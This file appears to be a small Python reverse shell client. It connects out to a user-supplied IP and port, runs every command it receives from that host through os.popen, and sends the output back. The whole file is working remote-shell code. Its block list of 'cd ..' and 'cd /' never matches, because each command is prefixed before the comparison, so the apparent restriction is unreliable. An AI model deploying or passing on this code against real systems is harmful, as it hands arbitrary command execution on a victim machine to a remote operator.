import socket
import os

MY_IP = input("IP: ")
MY_PORT = input("PORT: ")

if len(str(MY_IP)) > 0 and len(str(MY_PORT)) > 0:

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((MY_IP,int(MY_PORT)))

    NOTALLOWED = ['cd ..', 'cd /']


    while True:
        msg = "echo output: && " + str(s.recv(1024).decode("utf-8"))
        print(msg)
        print("Got it...")
        if msg not in NOTALLOWED:
            terminal = os.popen(msg).read()
            s.send(bytes(terminal,"utf-8"))
            print("Done.")
        else:
            print("Sorry I can't")
            s.send(bytes("Sorry I can't","utf-8"))

else:
    print("There is a problem with IP or PORT")
